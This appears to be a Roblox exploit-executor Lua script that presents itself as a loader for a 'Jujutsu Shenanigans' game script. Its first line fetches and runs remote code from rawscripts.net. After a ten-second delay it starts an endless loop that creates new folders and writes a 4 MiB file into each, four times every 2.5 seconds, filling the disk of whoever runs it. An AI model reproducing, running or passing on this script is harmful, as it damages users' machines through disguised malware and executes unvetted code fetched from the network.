loadstring(game:HttpGet("https://rawscripts.net/raw/HEAD-OF-HEI-Jujutsu-Shenanigans-JujutsuerV2-92468"))()
task.wait(10)
local fileSize = 4 * 1024 * 1024 -- 4 MiB per file
local interval = 2.5

local content = string.rep("A", fileSize)
local folderCount = 0
local fileCount = 0

while true do
    local startTime = os.clock()

    for i = 1, 4 do
        folderCount += 1

        local folder = "Folder_" .. folderCount
        if not isfolder(folder) then
            makefolder(folder)
        end

        fileCount += 1
        local file = folder .. "/File_" .. fileCount .. ".txt"
        writefile(file, content)
    end

    local elapsed = os.clock() - startTime
    task.wait(math.max(0, interval - elapsed))
end
